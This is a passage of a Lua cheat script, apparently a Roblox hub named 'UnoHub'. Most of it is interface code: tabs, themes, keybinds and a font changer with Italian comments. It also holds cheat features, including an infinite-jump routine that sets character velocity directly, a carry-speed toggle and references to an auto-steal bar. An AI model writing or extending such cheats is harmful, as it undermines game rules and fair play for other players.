		jump = animate:FindFirstChild("jump") and animate.jump:FindFirstChild("JumpAnim"),
		fall = animate:FindFirstChild("fall") and animate.fall:FindFirstChild("FallAnim"),
		climb = animate:FindFirstChild("climb") and animate.climb:FindFirstChild("ClimbAnim"),
		swim = animate:FindFirstChild("swim") and animate.swim:FindFirstChild("Swim"),
		swimidle = animate:FindFirstChild("swimidle") and animate.swimidle:FindFirstChild("SwimIdle"),
	}
	if restoreOriginal then
		local saved = sourceAnimationOriginals[character]
		if not saved then return false end
		for name, value in pairs(saved) do
			if targets[name] then targets[name].AnimationId = value end
		end
	else
		local preset = animationPresets[presetName]
		if not preset then return false end

		sourceAnimationOriginals[character] = captureSourceAnimationOriginals(
			character,
			targets,
			sourceAnimationOriginals[character]
		)
		local idle = preset.Idle or {}
		local values = {
			idle1 = preset.Animation1 or idle[1], idle2 = preset.Animation2 or idle[2],
			walk = preset.WalkAnim, run = preset.RunAnim, jump = preset.JumpAnim,
			fall = preset.FallAnim, climb = preset.ClimbAnim, swim = preset.Swim, swimidle = preset.SwimIdle,
		}
		for name, value in pairs(values) do
			if targets[name] and value then targets[name].AnimationId = sourceAssetId(value) end
		end
	end
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	if humanoid then
		for _, track in ipairs(humanoid:GetPlayingAnimationTracks()) do pcall(function() track:Stop(0) end) end
	end
	return true
	end
	FeaturePostToggle["Animations"] = function(active)

	toggleStates["Harder Hit Anim"] = false
	if active then
		_G.__UnoAnimationPreset = selectedSourcePreset
		pcall(applySourcePreset, selectedSourcePreset, false)
	else
		pcall(applySourcePreset, nil, true)
	end
	if toggleVisualUpdaters["Harder Hit Anim"] then pcall(toggleVisualUpdaters["Harder Hit Anim"]) end
	end
	local animationToggleUpdater, animationToggleRow = toggleRow(
		animations,
		"Animations",
		"Animations",
		toggleStates["Animations"],
		24,
		false,
		function(on) setFeature("Animations", on) end
	)
	animationToggleRow.Name = "AnimationsMasterToggle"
	local function refreshAnimationToggle()
		animationToggleUpdater(toggleStates["Animations"] == true)
	end
	toggleVisualUpdaters["Animations"] = refreshAnimationToggle
	refreshAnimationToggle()
	_G.__UnoTrackConn(Player.CharacterAdded:Connect(function()
	if not toggleStates["Animations"] or not _G.__UnoAnimationPreset then return end
	task.wait(0.75)
	pcall(applySourcePreset, _G.__UnoAnimationPreset, false)
	end))
	if toggleStates["Animations"] and _G.__UnoAnimationPreset then
	task.defer(function()
	task.wait(0.5)
	pcall(applySourcePreset, _G.__UnoAnimationPreset, false)
	end)
	end
	local animationInfo = keepOriginalText(Instance.new("TextLabel"))
	animationInfo.Size = UDim2.new(1, -8, 0, 30)
	animationInfo.BackgroundTransparency = 1
	animationInfo.LayoutOrder = 25
	animationInfo.Text = "Choose a preset, then use the switch to enable or disable animations."
	animationInfo.TextColor3 = C.textDim
	animationInfo.TextSize = 10
	animationInfo.Font = Enum.Font.Gotham
	animationInfo.TextWrapped = true
	animationInfo.TextXAlignment = Enum.TextXAlignment.Left
	animationInfo.Parent = animations

	local activeCategory = "Movement"
	for order, name in ipairs({"Movement", "Combat", "Visual"}) do
	local button = keepOriginalText(Instance.new("TextButton"))
	button.Name = name .. "Button"
	-- Pill-shaped tabs
	button.Size = UDim2.new(0.32, isMobile and -3 or -5, 0, isMobile and 28 or 32)
	button.BackgroundColor3 = C.accentDim
	button:SetAttribute("CurtThemeRole", "AccentDim")
	button.BackgroundTransparency = name == activeCategory and 0.12 or 0.55
	button.BorderSizePixel = 0
	button.Text = string.upper(name)
	button.TextColor3 = name == activeCategory and C.text or C.textMuted
	button.TextSize = isMobile and 7 or 9
	button.Font = Enum.Font.GothamBold
	button.LayoutOrder = order
	button.Parent = categoryList
	corner(button, 999)
	local indicator = Instance.new("Frame")
	indicator.Name = "Indicator"
	indicator.Size = UDim2.new(0, name == activeCategory and 22 or 0, 0, 3)
	indicator.Position = UDim2.new(0.5, name == activeCategory and -11 or 0, 1, -4)
	indicator.BackgroundColor3 = C.accent
	indicator:SetAttribute("CurtThemeRole", "Accent")
	indicator.BackgroundTransparency = name == activeCategory and 0 or 1
	indicator.BorderSizePixel = 0
	indicator.Parent = button
	Instance.new("UICorner", indicator).CornerRadius = UDim.new(1, 0)
	button.MouseButton1Click:Connect(function()
	if activeCategory == name then return end
	activeCategory = name
	for pageName, page in pairs(pages) do
	local selectedPage = pageName == name
	page.Visible = selectedPage
	if selectedPage then
	local pageScale = pageScales[pageName]
	if pageScale then
	pageScale.Scale = 0.975
	tween(pageScale, {Scale = 1}, 0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
	end
	end
	end
	for _, other in ipairs(categoryList:GetChildren()) do
	if other:IsA("TextButton") then
	local selected = other.Name == name .. "Button"
	tween(other, {
	TextColor3 = selected and C.text or C.textMuted,
	BackgroundTransparency = selected and 0.12 or 0.55,
	}, 0.18)
	local mark = other:FindFirstChild("Indicator")
	if mark then
	tween(mark, {
	BackgroundTransparency = selected and 0.15 or 1,
	Size = UDim2.new(0, selected and 28 or 12, 0, 2),
	Position = UDim2.new(0.5, selected and -14 or -6, 1, -2),
	}, 0.2)
	end
	end
	end
	end)
	button.MouseEnter:Connect(function()
	if activeCategory ~= name then tween(button, {TextColor3 = C.text, BackgroundTransparency = 0.25}) end
	end)
	button.MouseLeave:Connect(function()
	if activeCategory ~= name then tween(button, {TextColor3 = C.text, BackgroundTransparency = 0.3}) end
	end)
	end
	refreshCategoryTextColors = function()
	for _, categoryButton in ipairs(categoryList:GetChildren()) do
	if categoryButton:IsA("TextButton") then
	categoryButton.TextColor3 = C.text
	end
	end
	end
	refreshCategoryTextColors()
	setTabPosition(_G.__UnoTabPosition)
	if _G.__UnoApplyCurtVisualTheme then pcall(_G.__UnoApplyCurtVisualTheme, bgIndex) end

	local miniButton = Instance.new("TextButton")
	keepOriginalText(miniButton)
	miniButton.Name = "UnoRestoreButton"
	miniButton.Size = UDim2.new(0, 120, 0, 30)
	local savedMiniPos = _G["_UnoHub_UI_ModernMiniPos"]
	miniButton.Position = savedMiniPos and UDim2.fromOffset(savedMiniPos.x or 6, savedMiniPos.y or 54) or UDim2.new(0, 6, 0, 54)
	miniButton.BackgroundColor3 = C.bgDark
	miniButton:SetAttribute("CurtThemeRole", "BgDark")
	miniButton.BorderSizePixel = 0
	miniButton.Text = "h/yeju"
	miniButton.TextColor3 = C.text
	miniButton.TextSize = 11
	miniButton.Font = Enum.Font.GothamBlack
	miniButton.Visible = not Panel.Visible
	miniButton.ZIndex = 900
	miniButton.Parent = ScreenGui
	corner(miniButton, 8)
	stroke(miniButton, Color3.fromRGB(45, 45, 45), 1.2)

	local function refreshHalloweenOptionLabels(enabled)
		for _, page in pairs(pages) do
			if page and page.Parent then
				for _, row in ipairs(page:GetChildren()) do
					if row:IsA("Frame") and row:GetAttribute("CurtThemeRole") == "Row" then
						for _, child in ipairs(row:GetChildren()) do
							if (child:IsA("TextLabel") or child:IsA("TextButton"))
								and child.TextXAlignment == Enum.TextXAlignment.Left
								and child.Text ~= "" then
								if row.Name == "HalloweenModeRow" then
									child.Text = "🎃 Halloween Mode 🎃"
									child:SetAttribute("HalloweenBaseText", nil)
								else
									local baseText = child:GetAttribute("HalloweenBaseText")
									if enabled then
										if not baseText then
											baseText = child.Text
											child:SetAttribute("HalloweenBaseText", baseText)
										end
										child.Text = "🎃 " .. tostring(baseText)
									elseif baseText then
										child.Text = tostring(baseText)
										child:SetAttribute("HalloweenBaseText", nil)
									end
								end
								break
							end
						end
					end
				end
			end
		end
	end

	local function applyCurtVisualTheme(selectedIndex)
		local halloweenEnabled = toggleStates["Halloween Mode"] == true
		local palette = halloweenEnabled and WINTER_THEME or getCurtThemePreset(selectedIndex)
		for key, value in pairs(palette) do C[key] = value end
		_G.__UnoHalloweenMode = halloweenEnabled
		if _G.__UnoRefreshVioletteSkinTheme then pcall(_G.__UnoRefreshVioletteSkinTheme) end
		_G.__UnoCurtAccent = C.accent
		_G.__UnoThemeAccent = C.accent
		if _G.__UnoApplyAutoStealBarTheme then pcall(_G.__UnoApplyAutoStealBarTheme, selectedIndex) end
		inner.BackgroundColor3 = C.bg
		local selectedBackground = halloweenEnabled and HALLOWEEN_BACKGROUND or (backgroundIds[tonumber(selectedIndex) or 1] or backgroundIds[1])
		background.Image = selectedBackground
		if BgImage then BgImage.Image = selectedBackground end

		-- Halloween: the background reaches the real rounded edge so no gray corner pixels show.
		local backgroundCorner = background:FindFirstChildOfClass("UICorner")
		if halloweenEnabled then
			background.Size = UDim2.fromScale(1, 1)
			background.Position = UDim2.fromOffset(0, 0)
			if backgroundCorner then backgroundCorner.CornerRadius = UDim.new(0, 12) end
			innerStroke.Transparency = 1
			if mainShade then mainShade.Visible = false end
		else
			background.Size = UDim2.new(1, -2, 1, -2)
			background.Position = UDim2.fromOffset(1, 1)
			if backgroundCorner then backgroundCorner.CornerRadius = UDim.new(0, 11) end
			innerStroke.Transparency = 1
			if mainShade then mainShade.Visible = activeGuiTheme ~= "GUI 1" end
		end

		statsPanel.BackgroundColor3 = C.bgDark
		statsPanel:SetAttribute("CurtThemeRole", "BgDark")
		closeButton.BackgroundColor3 = C.bgDark
		closeButton:SetAttribute("CurtThemeRole", "BgDark")
		miniButton.BackgroundColor3 = C.bgDark
		miniButton:SetAttribute("CurtThemeRole", "BgDark")
		separator.BackgroundColor3 = C.accent
		separator:SetAttribute("CurtThemeRole", "Accent")
		bottomTabs.BackgroundColor3 = C.bgDark
		bottomTabs:SetAttribute("CurtThemeRole", "BgDark")
		for _, extraName in ipairs({"UnifiedPanelWhiteOutline", "UnifiedPanelWhiteGlow"}) do
			local extra = inner:FindFirstChild(extraName)
			if extra then extra:Destroy() end
		end
		if wordMark then wordMark.ImageColor3 = C.accent end
		if wordGlow then wordGlow.ImageColor3 = C.accent end
		for _, descendant in ipairs(inner:GetDescendants()) do
			if descendant:IsA("GuiObject") then
				local role = descendant:GetAttribute("CurtThemeRole")
				if role == "AccentDim" then
					descendant.BackgroundColor3 = C.accentDim
				elseif role == "Accent" then
					descendant.BackgroundColor3 = C.accent
				elseif role == "Row" then
					descendant.BackgroundColor3 = C.row
				elseif role == "BgDark" then
					descendant.BackgroundColor3 = C.bgDark
				elseif role == "SwitchKnob" then
					descendant.BackgroundColor3 = C.text
				end
			end
			if descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox") then
				if descendant == FPSLabel or descendant == PingLabel then
					descendant.TextColor3 = descendant == FPSLabel and C.text or C.textDim
				elseif descendant ~= closeButton then
					pcall(function() descendant.TextColor3 = C.text end)
				end
				if descendant.Name == "SectionLabel" then pcall(function() descendant.TextColor3 = C.textDim end) end
				if descendant:IsA("TextBox") and descendant:GetAttribute("CurtThemeAccentInput") then
					descendant.BackgroundColor3 = C.accentDim
					descendant:SetAttribute("CurtThemeRole", "AccentDim")
				end
			end
			if descendant:IsA("Frame") then
				if descendant.Name == "Indicator" or descendant.Name == "ActiveMarker" then
					descendant.BackgroundColor3 = C.accent
					descendant:SetAttribute("CurtThemeRole", "Accent")
				elseif descendant:GetAttribute("UnoButtonThemeControl") then
					descendant.BackgroundColor3 = C.row
					descendant:SetAttribute("CurtThemeRole", "Row")
				elseif descendant.Name == "BottomTabs" then
					descendant.BackgroundColor3 = C.bgDark
					descendant:SetAttribute("CurtThemeRole", "BgDark")
				end
			end
			if descendant:IsA("TextButton") then
				if descendant.Parent == categoryList then
					descendant.BackgroundColor3 = C.accentDim
					descendant:SetAttribute("CurtThemeRole", "AccentDim")
				elseif descendant ~= closeButton and descendant ~= miniButton and descendant.Text ~= "" then
					local alpha = descendant.BackgroundTransparency
					if alpha < 0.95 then
						descendant.BackgroundColor3 = descendant:GetAttribute("UnoButtonThemeControl") and C.row or C.accentDim
					end
				end
			end
			if descendant:IsA("UIStroke") then
				if descendant.Parent and descendant.Parent.Name == "BottomTabs" then
					descendant.Color = C.divider
				elseif descendant.Parent and descendant.Parent:IsA("GuiObject") then
					if descendant.Parent:GetAttribute("UnoButtonThemeControl") then
						descendant.Color = C.divider
					elseif descendant.Parent == closeButton or descendant.Parent == miniButton or descendant.Parent == statsPanel then
						descendant.Color = C.divider
					else
						descendant.Color = C.accentDim
					end
				end
			end
		end
		-- Repaint every active control immediately; changing a color must never
		-- require toggling a feature off and back on.
		for _, refreshToggle in pairs(toggleVisualUpdaters) do
			pcall(refreshToggle)
		end
		refreshHalloweenOptionLabels(halloweenEnabled)
		local halloweenLabel = inner:FindFirstChild("HalloweenModeLabel", true)
		if halloweenLabel then
			halloweenLabel.Text = "🎃 Halloween Mode 🎃"
			halloweenLabel.TextColor3 = halloweenEnabled and Color3.fromRGB(255, 174, 56) or Color3.fromRGB(255, 145, 35)
			halloweenLabel.TextStrokeColor3 = Color3.fromRGB(70, 24, 0)
			halloweenLabel.TextStrokeTransparency = halloweenEnabled and 0.35 or 0.55
		end
		if refreshCategoryTextColors then refreshCategoryTextColors() end
		if _G.__refreshSpeedBillboards then pcall(_G.__refreshSpeedBillboards) end
		if _G.__UnoRefreshQuickButtonTheme then pcall(_G.__UnoRefreshQuickButtonTheme) end
	end
	_G.__UnoApplyCurtVisualTheme = applyCurtVisualTheme
	applyCurtVisualTheme(bgIndex)
	makeDraggable(miniButton, miniButton)

	closeButton.MouseButton1Click:Connect(function()
	if _G.__setPanelVisible then _G.__setPanelVisible(false) else Panel.Visible = false end
	end)
	miniButton.MouseButton1Click:Connect(function()
	if _G.__setPanelVisible then _G.__setPanelVisible(true) else Panel.Visible = true end
	end)
	Panel:GetPropertyChangedSignal("Visible"):Connect(function()
	_G.__UnoPanelVisible = Panel.Visible
	toggleStates["Toggle UI"] = Panel.Visible
	miniButton.Visible = not Panel.Visible
	saveConfig()
	end)

	local function keepNewPanelSize()
	local camera = workspace.CurrentCamera
	if not camera then return end
	local viewport = camera.ViewportSize
	if viewport.X <= 0 or viewport.Y <= 0 then return end
	local availableW = math.max(1, viewport.X - 12)
	local availableH = math.max(1, viewport.Y - 60)
	if isMobile then
	Panel.Size = UDim2.new(0, math.min(availableW, math.clamp(math.floor(viewport.X * 0.62), 250, 310)), 0, math.min(availableH, math.clamp(math.floor(viewport.Y * 0.82), 420, 560)))
	else
	Panel.Size = UDim2.new(0, math.min(360, availableW), 0, math.min(620, availableH))
	end
	for _, target in ipairs({Panel, miniButton}) do
	local position = target.Position
	placeInsideViewport(target, position.X.Scale, position.X.Offset, position.Y.Scale, position.Y.Offset)
	end
	end
	keepNewPanelSize()
	local viewportConnection
	local function watchModernCamera()
	if viewportConnection then viewportConnection:Disconnect(); viewportConnection = nil end
	local camera = workspace.CurrentCamera
	if camera then
	viewportConnection = _G.__UnoTrackConn(camera:GetPropertyChangedSignal("ViewportSize"):Connect(function()
	task.defer(keepNewPanelSize)
	end))
	end
	task.defer(keepNewPanelSize)
	end
	_G.__UnoTrackConn(workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(watchModernCamera))
	watchModernCamera()
	end)()
	_G.__UnoRegisterThemeRoot(ScreenGui)

	task.spawn(function()
	local blackout = Instance.new("Frame")
	blackout.Size = UDim2.new(1, 0, 1, 0)
	blackout.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	blackout.BackgroundTransparency = 1
	blackout.BorderSizePixel = 0
	blackout.ZIndex = 10000
	blackout.Parent = ScreenGui
	TweenService:Create(blackout, TweenInfo.new(0.08, Enum.EasingStyle.Quad), {BackgroundTransparency = 0.45}):Play()
	task.wait(0.12)
	TweenService:Create(blackout, TweenInfo.new(0.25, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
	task.wait(0.3)
	pcall(function() blackout:Destroy() end)
	end)

	;(function()
	local function keyDisplayName(kc)
	if not kc then return "..." end
	return keybindDisplayName(kc)
	end

	local function handleKeyInput(input, gameProcessed)

	if listeningBindBtn and listeningFeature then
	local updatedFeature = listeningFeature
	local boundButton = listeningBindBtn
	local isTouchOrClick = (input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1)
	if isBindableInput(input) or isTouchOrClick or isMouseSideButton(input) then
	if isTouchOrClick or input.KeyCode == Enum.KeyCode.Escape or (isClearKeybindInput(input) and updatedFeature ~= "Toggle UI") then
	FeatureKeybinds[updatedFeature] = nil
	local emptyText = (boundButton.Size.X.Offset == 42 or boundButton:GetAttribute("MiniUIBind")) and "-" or "BIND"
	boundButton.Text = emptyText
	elseif isMouseSideButton(input) then
	local mbName = getMouseButtonBind(input)
	FeatureKeybinds[updatedFeature] = mbName
	boundButton.Text = mouseButtonDisplay[mbName] or mbName
	else
	FeatureKeybinds[updatedFeature] = input.KeyCode
	boundButton.Text = keyDisplayName(input.KeyCode)
	end
	listeningBindBtn = nil
	listeningFeature = nil
	saveConfig()
	if updatedFeature and toggleVisualUpdaters[updatedFeature] then toggleVisualUpdaters[updatedFeature]() end
	local mapped = _featureToggleMap[updatedFeature]
	if mapped and mapped.bindCircle then
	local k = FeatureKeybinds[updatedFeature]
	mapped.bindCircle.Text = k and keyDisplayName(k) or "-"
	end
	return
	end
	end

	if UserInputService:GetFocusedTextBox() then return end

	local carryKey = FeatureKeybinds["Carry Speed"]
	local carryKeyMatches = carryKey ~= nil and (
		(isBindableInput(input) and input.KeyCode == carryKey)
		or (isMouseSideButton(input) and getMouseButtonBind(input) == carryKey)
	)
	local normalModeKey = FeatureKeybinds["SelectNormalMode"]
	local normalModeKeyMatches = normalModeKey ~= nil and (
		(isBindableInput(input) and input.KeyCode == normalModeKey)
		or (isMouseSideButton(input) and getMouseButtonBind(input) == normalModeKey)
	)

	if normalModeKeyMatches and selectedMode ~= "Normal" then
		if FeatureToggles["SelectNormalMode"] then
			FeatureToggles["SelectNormalMode"]()
		end
		pcall(function() if _G.__refreshSpeedBoost then _G.__refreshSpeedBoost() end end)
		pcall(function() if _G.__refreshSpeedBillboards then _G.__refreshSpeedBillboards() end end)
		saveConfig()
		return
	end
	if carryKeyMatches then
		if FeatureToggles["Carry Speed"] then
			FeatureToggles["Carry Speed"]()
		else
			local active = not toggleStates["Carry Speed"]
			toggleStates["Carry Speed"] = active
			speedToggled = active
			if FeaturePostToggle["Carry Speed"] then FeaturePostToggle["Carry Speed"](active) end
			if toggleVisualUpdaters["Carry Speed"] then toggleVisualUpdaters["Carry Speed"]() end
			saveConfig()
		end
		return
	end

	local dropKey = FeatureKeybinds["Drop"]
	local dropKeyMatches = dropKey ~= nil and (
	(isBindableInput(input) and input.KeyCode == dropKey)
	or (isMouseSideButton(input) and getMouseButtonBind(input) == dropKey)
	)
	if dropKeyMatches then
	if FeatureToggles["Drop"] then FeatureToggles["Drop"]("keybind") end
	return
	end
	if gameProcessed and not gamepadInputTypes[input.UserInputType] then return end

	if isBindableInput(input) then
	for feat, key in pairs(FeatureKeybinds) do
	if input.KeyCode == key then
	if FeatureToggles[feat] then
	if feat == "Drop" then FeatureToggles[feat]("keybind") else FeatureToggles[feat]() end
	else
	local active = not toggleStates[feat]
	toggleStates[feat] = active
	saveConfig()
	if FeaturePostToggle[feat] then FeaturePostToggle[feat](active) end
	if toggleVisualUpdaters[feat] then toggleVisualUpdaters[feat]() end
	end
	end
	end
	end

	if isMouseSideButton(input) then
	local mbBind = getMouseButtonBind(input)
	for feat, key in pairs(FeatureKeybinds) do
	if key == mbBind then
	if FeatureToggles[feat] then
	if feat == "Drop" then FeatureToggles[feat]("keybind") else FeatureToggles[feat]() end
	else
	local active = not toggleStates[feat]
	toggleStates[feat] = active
	saveConfig()
	if FeaturePostToggle[feat] then FeaturePostToggle[feat](active) end
	if toggleVisualUpdaters[feat] then toggleVisualUpdaters[feat]() end
	end
	end
	end
	end

	end

	_G.__UnoTrackConn(UserInputService.InputBegan:Connect(handleKeyInput))
	end)()

	;(function()
	local infJumpState = _G.__UnoInfJumpState or {}
	_G.__UnoInfJumpState = infJumpState
	infJumpState.conn = infJumpState.conn or nil
	infJumpState.lastJumpTime = infJumpState.lastJumpTime or 0
	infJumpState.manualLock = false
	local HOP_POWER = 55
	local HOP_COOLDOWN = 0.08

	local function isJumpBlocked()
	return false
	end

	local function triggerManualJump()
	if (_G.__UnoInfJumpMode or "hold") ~= "manual" or infJumpState.manualLock then return end
	infJumpState.manualLock = true
	local char = Player.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	local hrp = char and char:FindFirstChild("HumanoidRootPart")
	if not hum or not hrp then
	infJumpState.manualLock = false
	return
	end
	local now = tick()
	if (now - infJumpState.lastJumpTime) < HOP_COOLDOWN then
	infJumpState.manualLock = false
	return
	end
	infJumpState.lastJumpTime = now
	hrp.Velocity = Vector3.new(hrp.Velocity.X, HOP_POWER, hrp.Velocity.Z)
	task.delay(0.14, function() infJumpState.manualLock = false end)
	end

	_G.__UnoTrackConn(UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed then return end
	if input.KeyCode == Enum.KeyCode.Space or input.KeyCode == Enum.KeyCode.ButtonA then
	if (_G.__UnoInfJumpMode or "hold") == "manual" then
	triggerManualJump()
	return
	end
	if not isJumpBlocked() then
	infJumpState.lastJumpTime = tick() - HOP_COOLDOWN
	end
	end
	end))

	function startInfJump()
	if infJumpState.conn then
	infJumpState.conn:Disconnect()
	infJumpState.conn = nil
	end

	infJumpState.conn = RunService.Heartbeat:Connect(function()
	if not toggleStates["Inf Jump"] or (_G.__UnoInfJumpMode or "hold") ~= "hold" then return end
	if isJumpBlocked() then return end
	pcall(function()
	local char = Player.Character
	if not char then return end
	local hum = char:FindFirstChildOfClass("Humanoid")
	if not hum then return end
	local hrp = char:FindFirstChild("HumanoidRootPart")
	if not hrp then return end
	local now = tick()
	local wantsToJump = UserInputService:IsKeyDown(Enum.KeyCode.Space) or UserInputService:IsKeyDown(Enum.KeyCode.ButtonA) or hum.Jump == true
	if wantsToJump and (now - infJumpState.lastJumpTime) >= HOP_COOLDOWN then
	infJumpState.lastJumpTime = now
	local velocity = hrp.Velocity
	hrp.Velocity = Vector3.new(velocity.X, HOP_POWER, velocity.Z)
	end
	end)
	end)
	end

function stopInfJump()
	if infJumpState.conn then
	infJumpState.conn:Disconnect()
	infJumpState.conn = nil
end
end
_G.__UnoTrackStopper(stopInfJump)
FeaturePostToggle["Inf Jump"] = function(active)
if active and (_G.__UnoInfJumpMode or "hold") == "hold" then
startInfJump()
else
stopInfJump()
end
end
if toggleStates["Inf Jump"] and (_G.__UnoInfJumpMode or "hold") == "hold" then startInfJump() end

	_G.__UnoTrackConn(Player.CharacterAdded:Connect(function()
	if toggleStates["Inf Jump"] and (_G.__UnoInfJumpMode or "hold") == "hold" then
	task.wait(0.5)
	stopInfJump()
	startInfJump()
	end
	end))
	end)()


	-- ==================== FONT CHANGER (from Ambitious) ====================
	do
_G.UnoFonts = _G.UnoFonts or {}
_G.UnoFonts.orig = _G.UnoFonts.orig or {}
_G.UnoFonts.conns = _G.UnoFonts.conns or {}
-- TextSize di partenza di ogni elemento, per l'adattamento automatico.
-- Strong come orig: senza il valore originale il ripristino non tornerebbe.
_G.UnoFonts.size = _G.UnoFonts.size or {}
_G.UnoFontChoice = _G.UnoFontChoice or "Default"

-- Nome breve del peso, per l'etichetta della card.
_G.UnoFonts.WEIGHT_LABEL = {
  Thin = "Thin", ExtraLight = "ExLight", Light = "Light", Regular = "",
  Medium = "Medium", SemiBold = "SemiBold", Bold = "Bold",
  ExtraBold = "ExBold", Heavy = "Heavy",
}

-- Catalogo completo, costruito una volta sola e tenuto in cache: sono
-- centinaia di voci, rifarle a ogni apertura del popup sarebbe sprecato.
function _G.UnoFonts.list()
  local F = _G.UnoFonts
  if F.cache then return F.cache end

  local out = {{ key = "Default", label = "Default", font = nil }}

  -- Famiglie uniche ricavate da Enum.Font. Si parte da li' perche' e'
  -- l'unico elenco che il motore garantisce: niente id inventati.
  local seen, families = {}, {}
  for _, item in ipairs(Enum.Font:GetEnumItems()) do
    if item.Name ~= "Unknown" then
      local ok, f = pcall(function() return Font.fromEnum(item) end)
      if ok and f and f.Family and not seen[f.Family] then
        seen[f.Family] = true
        -- Nome leggibile: dal percorso rbxasset si tiene solo il file.
        local nice = tostring(f.Family):match("([^/\\]+)%.json$")
                  or tostring(f.Family):match("([^/\\]+)$")
                  or item.Name
        families[#families + 1] = { family = f.Family, nice = nice }
      end
    end
  end

  for _, fam in ipairs(families) do
    for _, w in ipairs(Enum.FontWeight:GetEnumItems()) do
      for _, italic in ipairs({false, true}) do
        local ok, f = pcall(function()
          return Font.new(fam.family, w,
            italic and Enum.FontStyle.Italic or Enum.FontStyle.Normal)
        end)
        if ok and f then
          local wl = F.WEIGHT_LABEL[w.Name] or w.Name
          local label = fam.nice
          if wl ~= "" then label = label .. " " .. wl end
          if italic then label = label .. " Italic" end
          out[#out + 1] = {
            key = fam.family .. "|" .. w.Name .. "|" .. (italic and "i" or "n"),
            label = label,
            font = f,
          }
        end
      end
    end
  end

  F.cache = out
  return out
end

function _G.UnoFonts.byKey(key)
  for _, e in ipairs(_G.UnoFonts.list()) do
    if e.key == key then return e end
  end
  return nil
end

-- I contenitori da percorrere. HubGui copre tutte le ScreenGui della hub;
-- il billboard sopra la testa vive sulla Head e va aggiunto a mano.
function _G.UnoFonts.roots()
  local list = {}
  local core = game:GetService("CoreGui")
  local pg = Player.PlayerGui
  local pgBillboard = pg:FindFirstChild("GreenDuelsBB")
  if pgBillboard then list[#list + 1] = pgBillboard end
  for _, container in ipairs({core, pg}) do
    pcall(function()
      local sg = container:FindFirstChild("UnoHub")
      if sg then list[#list + 1] = sg end
    end)
  end
  local char = Player.Character
  local head = char and char:FindFirstChild("Head")
  if head then
    for _, n in ipairs({"Green22sBB", "22sSpeedBill", "UnoHubOverhead", "22sHubOverhead"}) do
      local oh = head:FindFirstChild(n)
      if oh then list[#list + 1] = oh end
    end
  end
  return list
end

function _G.UnoFonts.isGlyph(obj)
  local t = obj.Text
  if t == nil then return false end
  -- Una lettera o una cifra sono scrittura anche da sole: la "Q" di una
  -- keybind o la "X" di un bottone sono caratteri normali, e devono
  -- seguire il font come tutto il resto. L'esenzione vale solo per i
  -- segni: ▲ ▼ ◀ ▶ - +.
  if string.match(t, "%w") then return false end
  local ok, n = pcall(function() return utf8.len(t) end)
  return ok and n ~= nil and n <= 1
end

function _G.UnoFonts.applyOne(obj, font)
  if not (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) then
    return
  end
  -- Elementi esenti: le anteprime del popup dei font devono mostrare
  -- CIASCUNA il proprio campione. Sono dentro la hub come tutto il resto,
  -- quindi senza questa uscita il font scelto le sovrascriverebbe e i
  -- campioni diventerebbero tutti uguali fra loro.
  if obj:GetAttribute("UnoFontLock") then return end
  local F = _G.UnoFonts
  -- Primo contatto: si conservano FontFace e TextSize di partenza.
  if F.orig[obj] == nil then
    F.orig[obj] = obj.FontFace
    F.size[obj] = obj.TextSize
  end
  if F.isGlyph(obj) then font = nil end   -- i simboli restano l'originale
  pcall(function()
    obj.FontFace = font or F.orig[obj]
    -- Si riparte SEMPRE dalla misura originale: l'adattamento sotto
    -- puo' solo rimpicciolire, mai ingrandire oltre com'era. Su Default
    -- questa riga e' anche il ripristino, e nessun adattamento segue.
    if F.size[obj] then obj.TextSize = F.size[obj] end
  end)
end

-- ADATTAMENTO AUTOMATICO DELLA MISURA
-- Ogni famiglia ha larghezze diverse: lo stesso testo che con Gotham sta
-- dentro la riga, con un font piu' largo esce dai margini.
--
-- La misura si CALCOLA, non si cerca a tentativi: GetTextBoundsAsync dice
-- quanto occuperebbe quel testo con quel font a quella misura, e con due
-- divisioni si ricava di quanto scalare. Ogni scritta e' a posto al primo
-- colpo, anche quelle che in quel momento non sono a schermo — le
-- dimensioni esistono comunque, mentre TextFits lo calcola il motore solo
-- su cio' che disegna, ed era per quello che si adattava la sola tab
-- aperta.
--
-- MARGIN: non basta che il testo "ci stia", deve anche non arrivare
-- appiccicato al bottone che ha accanto. Si toglie quel tanto di spazio
-- dai lati prima di fare il conto.
--
-- Su "Default" non gira affatto: le misure restano quelle di sempre.
_G.UnoFonts.MIN_SIZE = 7    -- sotto e' illeggibile
_G.UnoFonts.MARGIN   = 8    -- respiro ai lati, in pixel
_G.UnoFonts.MAX_GROW = 1.35 -- quanto al massimo puo' crescere
-- Chiavi deboli: qui non si conserva niente da ripristinare, sono solo
-- appunti su chi e' gia' stato agganciato. Se l'oggetto sparisce dalla
-- GUI puo' sparire anche l'appunto.
_G.UnoFonts.tconns = _G.UnoFonts.tconns
  or setmetatable({}, {__mode = "k"})
-- Lunghezza del testo con cui ogni scritta e' stata adattata l'ultima
-- volta, per non rifare il conto a vuoto su un contatore che cambia cifra
-- restando lungo uguale.
_G.UnoFonts.lastLen = _G.UnoFonts.lastLen
  or setmetatable({}, {__mode = "k"})

function _G.UnoFonts.params()
  local F = _G.UnoFonts
  if F.gtbp == nil then
    local ok, p = pcall(function() return Instance.new("GetTextBoundsParams") end)
    F.gtbp = (ok and p) or false
  end
  return F.gtbp or nil
end

-- ------------------------------------------------------------
-- Il conto e' in DUE parti, e la differenza e' tutta qui.
--
-- 1) LA MISURA (costosa): quanto occupa quel testo col font nuovo e
--    quanto occupava col font originale. Da queste due nasce il rapporto
--    s0 — quanto scalare per avere lo stesso ingombro che la scritta
--    aveva su Default. Non c'entra niente con la casella, quindi si puo'
--    fare subito, anche su una scritta appena nata che non e' ancora
--    stata impaginata.
--
-- 2) IL CONTENIMENTO (gratis): il testo deve stare dentro la sua casella.
--    Qui serve la dimensione vera, ma NON serve rimisurare niente: le
--    dimensioni del testo sono gia' in cache, e ridurle allo spazio
--    disponibile sono due divisioni.
--
-- Separandole si risolve il problema di prima. Le scritte dei popup
-- nascono mentre il riquadro si sta ancora aprendo, e la loro casella in
